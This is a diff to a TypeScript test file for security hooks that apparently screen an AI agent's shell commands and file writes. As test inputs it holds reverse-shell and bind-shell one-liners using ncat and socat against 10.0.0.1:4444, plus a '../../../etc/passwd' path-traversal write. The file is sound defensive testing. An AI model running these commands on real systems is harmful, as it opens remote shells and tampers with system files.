@@ -172,22 +172,40 @@ describe("bashSecurityHook — blocks dangerous patterns", () => {
 		expect(result).toEqual({ continue: false });
 	});
 
-	test("blocks ncat", async () => {
-		const result = await bashSecurityHook(
-			mockBashInput("ncat -e /bin/bash 10.0.0.1 4444"),
-			"id",
-			{},
-		);
-		expect(result).toEqual({ continue: false });
-	});
-
-	test("blocks socat", async () => {
+	test("blocks socat exec", async () => {
 		const result = await bashSecurityHook(
 			mockBashInput("socat exec:'/bin/bash' tcp:10.0.0.1:4444"),
 			"id",
 			{},
 		);
 		expect(result).toEqual({ continue: false });
+	});
+
+	test("blocks socat tcp-listen", async () => {
+		const result = await bashSecurityHook(
+			mockBashInput("socat tcp-listen:4444 exec:/bin/sh"),
+			"id",
+			{},
+		);
+		expect(result).toEqual({ continue: false });
+	});
+
+	test("does not false-positive on sha256sum after pipe", async () => {
+		const result = await bashSecurityHook(
+			mockBashInput("cat file.tar.gz | sha256sum"),
+			"id",
+			{},
+		);
+		expect(result).toEqual({ continue: true });
+	});
+
+	test("does not false-positive on words containing blocked substrings", async () => {
+		const result = await bashSecurityHook(
+			mockBashInput("echo concatenate | grep ncat"),
+			"id",
+			{},
+		);
+		expect(result).toEqual({ continue: true });
 	});
 
 	// Privilege escalation
@@ -382,6 +400,18 @@ describe("createFileSystemBoundaryHook", () => {
 
 		test("blocks absolute path in /tmp outside projectDir", async () => {
 			const input = mockFileInput("Write", "/tmp/evil.sh");
+			const result = await hook(input, "id", {});
+			expect(result).toEqual({ continue: false });
+		});
+
+		test("allows relative path that resolves inside projectDir", async () => {
+			const input = mockFileInput("Write", "src/index.ts");
+			const result = await hook(input, "id", {});
+			expect(result).toEqual({ continue: true });
+		});
+
+		test("blocks relative path with ../ that escapes projectDir", async () => {
+			const input = mockFileInput("Write", "../../../etc/passwd");
 			const result = await hook(input, "id", {});
 			expect(result).toEqual({ continue: false });
 		});
